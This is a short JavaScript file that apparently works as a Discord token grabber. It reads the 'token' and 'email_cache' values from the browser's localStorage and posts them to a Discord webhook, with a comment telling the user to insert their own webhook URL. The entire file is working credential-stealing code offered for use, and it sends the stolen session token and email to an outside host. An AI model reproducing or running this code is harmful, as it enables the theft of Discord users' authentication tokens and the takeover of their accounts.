
function grab_token() {
    // grabs token from localstorage
    const token = localStorage.getItem('token');
    if (token && token !== '' && token !== null) {
            return token.split('"').join('')
    }
}

function grab_email() {
    // grabs email from localstorage
    const email = localStorage.getItem('email_cache')
    if (email && email !== '') {
        return email.split('"').join('')
    }
}

function send_data(data) {
    // sends the data over a discord webhook
    let xhtml = new XMLHttpRequest();
    let payload = JSON.stringify({"content": data})
    xhtml.open("POST", "https://discord.com/api/webhooks/", true) // replace with your webhook url
    xhtml.setRequestHeader("Content-Type", "application/json")
    xhtml.send(payload)
}

let token = grab_token()
let email = grab_email()
send_data("```asciidoc\n" +
    "Email :: " + email + '\n' +
    "Token :: " + token + '\n```')
